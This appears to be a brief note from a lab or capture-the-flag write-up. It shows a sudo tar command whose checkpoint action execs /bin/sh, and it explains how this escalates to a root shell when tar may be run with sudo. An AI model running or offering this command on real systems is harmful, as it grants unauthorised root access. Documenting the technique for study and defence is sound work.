```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
This command uses tar which we can run with sudo privs.
it basically tries to tar data from /dev/null to /dev/null and after reaching checkpoint which is almost immediate because of /dev/null and upon checkpoint it executes a new shell.